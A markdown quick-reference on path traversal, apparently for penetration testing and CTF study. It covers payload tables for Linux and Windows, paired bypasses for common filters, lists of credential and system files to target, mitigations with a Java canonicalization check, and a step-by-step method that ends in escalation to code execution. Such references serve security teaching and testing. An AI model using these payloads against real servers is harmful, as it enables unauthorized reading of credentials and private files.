# Path Traversal - Complete Quick Reference

## What is Path Traversal?

Also known as **directory traversal** or **dot-dot-slash attack**. Allows an attacker to read (and sometimes write) arbitrary files on the server by manipulating file path references.

### Impact — Access to:
- Application source code and data
- Credentials for back-end systems
- Sensitive OS files (`/etc/passwd`, `/etc/shadow`, `win.ini`, `SAM`)
- Configuration files (`.env`, `web.config`, `application.properties`)

---

## Where to Look

- Any parameter that takes a **filename** or **path** as input
- Common parameter names: `file=`, `path=`, `page=`, `doc=`, `folder=`, `root=`, `dir=`, `template=`, `include=`
- File download/upload endpoints
- Image/static resource loading (e.g., `?img=photo.png`)
- Language/locale selectors (`?lang=en.php`)

---

## Common Payloads

| Technique | Linux Example | Windows Example |
|---|---|---|
| **Basic traversal** | `../../../etc/passwd` | `..\..\..\windows\win.ini` |
| **Absolute path** | `/etc/passwd` | `C:\windows\win.ini` |
| **Nested traversal** (bypass strip) | `....//....//....//etc/passwd` | `....\\....\\....\\windows\win.ini` |
| **URL encoding** | `%2e%2e%2f%2e%2e%2fetc/passwd` | `%2e%2e%5c%2e%2e%5cwindows%5cwin.ini` |
| **Double URL encoding** | `%252e%252e%252f%252e%252e%252fetc/passwd` | `%252e%252e%255c%252e%252e%255cwindows%255cwin.ini` |
| **Expected base folder** | `/var/www/images/../../../etc/passwd` | — |
| **Null byte** (bypass extension check) | `../../../etc/passwd%00.png` | `..\..\..\..\win.ini%00.jpg` |
| **UTF-8 encoding** | `%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd` | — |
| **Mixed slashes** | `..\/..\/etc/passwd` | `../..\\windows\\win.ini` |

> **Tip:** The number of `../` depends on the depth from the current working directory to root. When in doubt, **add more** — extra `../` beyond root are simply ignored.

---

## Interesting Files to Target

### Linux
- `/etc/passwd` — user accounts
- `/etc/shadow` — password hashes (if readable)
- `/etc/hosts` — host mappings
- `/proc/self/environ` — environment variables
- `/proc/self/cmdline` — running process command
- `/home/<user>/.ssh/id_rsa` — SSH private keys
- `/home/<user>/.bash_history` — command history
- `/var/log/apache2/access.log` — web server logs (useful for log poisoning → RCE)

### Windows
- `C:\windows\win.ini`
- `C:\windows\system32\config\SAM` — password database
- `C:\windows\repair\SAM`
- `C:\inetpub\wwwroot\web.config`
- `C:\Users\<user>\.ssh\id_rsa`
- `C:\xampp\apache\conf\httpd.conf`

---

## Bypass Techniques Summarized

| Defense | Bypass |
|---|---|
| Strips `../` once | `....//` or `....\/` |
| Blocks `../` | Use absolute path `/etc/passwd` |
| URL decodes once then blocks | Double URL encode `%252e%252e%252f` |
| Requires file extension (`.png`) | Null byte `%00` before extension |
| Requires path starts with base folder | Prepend expected base: `/var/www/images/../../../etc/passwd` |
| Blocks `..` | Try UTF-8/overlong encoding `%c0%ae` |
| Backslash filtered | Use forward slash (or vice versa) |

---

## Mitigations

1. **Best:** Avoid passing user-supplied input to filesystem APIs altogether.
2. **Whitelist validation** — compare input against a list of permitted filenames.
3. **Input sanitization** — allow only alphanumeric characters; reject `..`, `/`, `\`, null bytes.
4. **Canonicalize + verify** — resolve the full path, then confirm it starts with the expected base directory:

```java
File file = new File(BASE_DIRECTORY, userInput);
if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
    // process file
}
```

5. **Chroot jails / sandboxing** — restrict the process's filesystem view.
6. **Least privilege** — run the application with minimal file-system permissions.
7. **WAF rules** — as an additional (not sole) layer of defense.

---

## Quick CTF Methodology

1. **Identify** the parameter accepting a file name/path.
2. **Try basic** `../../../etc/passwd` first.
3. **If blocked**, cycle through bypass techniques (encoding, nested, null byte, absolute path, mixed slashes).
4. **Check both** `/` and `\` — you might be on Windows.
5. **Automate** with Burp Intruder using a path traversal wordlist (e.g., from SecLists: `Fuzzing/LFI/`).
6. **Escalate** — once you can read files, look for credentials, SSH keys, source code, or logs for further exploitation (LFI → RCE via log poisoning).
